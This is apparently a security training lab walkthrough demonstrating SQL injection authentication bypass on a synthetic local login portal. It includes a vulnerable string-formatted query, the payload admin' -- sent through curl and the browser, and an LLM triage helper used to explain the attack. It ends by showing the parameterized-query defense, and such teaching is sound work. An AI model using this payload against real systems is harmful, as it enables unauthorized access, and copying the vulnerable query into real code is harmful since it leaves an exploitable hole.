# AI-assisted SQL injection auth bypass

## Scenario

Dojo Access is an enterprise identity and access management (IAM) gateway used by
internal staff to authenticate to corporate consoles. The application is synthetic
and runs exclusively within this local training lab.

The application backend verifies credentials by constructing a SQL query using string
formatting rather than parameterized queries.

Your goal is to understand normal authentication, observe how dynamic query
concatenation behaves when probed, use the AI triage helper to analyze the query logic,
and safely demonstrate administrative authentication bypass in the local target. Once
logged in as the `admin` account, the target registers a proof token with the local
collector.

## Start here

Start the lab in the Dojo UI. The target login portal is available in your browser at:

```text
http://localhost:9210
```

The proof collector status endpoint is available at:

```text
http://localhost:9211/status
```

Access the attacker container in a separate terminal:

```bash
docker exec -it dojo-sqli-tools bash
```

## 1. Test normal authentication

First, test valid credentials to observe standard authentication behavior. The portal
includes authorized test accounts:

* **Username:** `analyst`
* **Password:** `DojoAnalyst2026!`

From the attacker container, test the login endpoint:

```bash
curl -i -X POST http://target.dojo.local:8080/login \
  -d 'username=analyst' \
  -d 'password=DojoAnalyst2026!'
```

Notice that the response returns the user dashboard for Alex Chen (analyst) with
Tier-2 privileges.

## 2. Probe for SQL syntax sensitivity

Send a single quote (`'`) in the username field to test whether input is directly
embedded into the SQL interpreter without sanitization or parameterization:

```bash
curl -s -X POST http://target.dojo.local:8080/login \
  -d "username=analyst'" \
  -d 'password=test'
```

Inspect the output. Notice the diagnostic error returned:
`unrecognized token` or `syntax error`. This confirms that user input is being directly
interpolated into the query string, breaking the SQL statement syntax.

## 3. Ask the AI helper to analyze the query structure

The helper tool `sqli_triage.py` sends your probe details to your configured LLM
(`DOJO_LLM`: `openai`, `anthropic`, or `ollama`) to break down the query mechanics:

```bash
python /attacker/tools/sqli_triage.py \
  --url http://target.dojo.local:8080/login \
  --username "analyst'" \
  --password "test"
```

Review the model's triage breakdown:
1. What does the backend query template look like?
2. How does the single quote alter the string literal boundaries?
3. How can SQL comment syntax (`--` in SQLite) neutralize the subsequent password check?

## 4. Demonstrate authentication bypass as admin

In SQLite, the double dash (`--`) indicates that the remainder of the line is a comment.

Consider the dynamic query:
```sql
SELECT id, username, role, full_name, email FROM users WHERE username = '{username}' AND password = '{password}'
```

If the username supplied is:
```text
admin' --
```

The resulting query evaluated by SQLite becomes:
```sql
SELECT id, username, role, full_name, email FROM users WHERE username = 'admin' --' AND password = '...'
```

The password check is completely commented out, causing SQLite to authenticate the
first user matching `username = 'admin'`!

Test this in your browser:
1. Navigate to `http://localhost:9210/login`
2. Enter `admin' --` in the **Username** field.
3. Leave the **Password** field blank (or enter arbitrary text).
4. Click **Authenticate**.

Alternatively, test from the attacker container:
```bash
curl -i -X POST http://target.dojo.local:8080/login \
  --data-urlencode "username=admin' --" \
  -d "password=any"
```

The administrative console will appear, confirming authentication bypass and notifying
the local proof collector.

Verify the collector status:
```text
http://localhost:9211/status
```

It should report `"proved": true` with token `"dojo-sqli-auth-bypass"`.

## 5. Compare with the safe parameterized portal

Switch to the **Parameterized Safe Gateway** tab or navigate to:

```text
http://localhost:9210/safe-login
```

Try the same input (`admin' --`). Notice that the safe portal safely rejects the attempt:
```sql
SELECT id, username, role, full_name, email FROM users WHERE username = ? AND password = ?
```

Because parameterized queries separate code from data, `admin' --` is evaluated
literally as a username string rather than SQL code, completely neutralizing the attack.

## 6. Validate

Click **Validate** in the Dojo UI. The validator queries the local collector container.
Resetting the lab removes the proof volume, ensuring deterministic testing.

## What this lab teaches

1. **Root cause:** SQL injection occurs when untrusted input is concatenated directly into SQL command strings instead of being passed as parameters.
2. **Detection:** Diagnostic error messages and behavioral differences reveal when inputs affect query execution logic.
3. **AI assistance:** LLMs excel at explaining syntax differences and query logic alterations when given clear diagnostic feedback.
4. **Definitive Defense:** Parameterized queries (prepared statements) are the universal, robust defense against SQL injection.
